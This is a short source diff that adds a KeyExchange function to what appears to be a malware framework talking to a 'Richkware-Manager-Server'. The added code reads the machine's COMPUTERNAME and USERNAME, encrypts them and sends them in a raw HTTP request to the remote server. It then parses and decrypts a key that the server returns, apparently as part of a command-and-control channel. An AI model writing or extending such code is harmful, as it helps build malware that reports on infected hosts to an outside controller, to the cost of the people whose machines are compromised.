@@ -149,8 +149,30 @@ bool Network::UploadInfoToRichkwareManagerServer(const char * serverAddress, con
             "Host: " + serverAddress + "\r\n"+
                                      "Connection: close\r\n"+
                                      "\r\n").c_str());
-
     return true;
+}
+
+std::string Network::KeyExchange(const char * serverAddress, const char* port){
+    Crypto crypto(encryptionKey);
+    std::string key = "";
+
+    // create a database entry into the Richkware-Manager-Server, to obtain the encryption key server-side generated
+    UploadInfoToRichkwareManagerServer(serverAddress,port);
+
+    // Primary key in RMS database.
+    std::string name = getenv("COMPUTERNAME");
+    name.append("/");
+    name.append(getenv("USERNAME"));
+
+    name = crypto.Encrypt(name);
+    key = RawRequest(serverAddress, port, ("GET /Richkware-Manager-Server/GetEncryptionKey?id=" + name +" HTTP/1.1\r\n"
+            "Host: " + serverAddress + "\r\n"+
+                                     "Connection: close\r\n"+
+                                     "\r\n").c_str());
+    key = key.substr(key.find('$')+1,(key.find('#')-key.find('$'))-1);
+    key = crypto.Decrypt(key);
+
+    return key;
 }
 
 const char* Network::ResolveAddress(const char *address) {
